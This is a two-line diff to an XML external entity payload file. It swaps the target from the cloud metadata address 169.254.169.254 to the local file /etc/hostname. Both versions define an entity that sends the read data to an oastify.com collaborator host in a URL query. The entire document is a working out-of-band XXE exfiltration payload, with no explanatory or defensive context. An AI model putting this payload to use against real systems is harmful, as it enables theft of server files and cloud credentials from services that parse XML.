@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "http://169.254.169.254/">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://plec7hj5sitin85gpdl5zuhc43avylma.oastify.com/?d=%data;'>">
+<!ENTITY % data SYSTEM "file:///etc/hostname">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://pkdc6hi5risim84godk5yugc339wxmlb.oastify.com/?d=%data;'>">
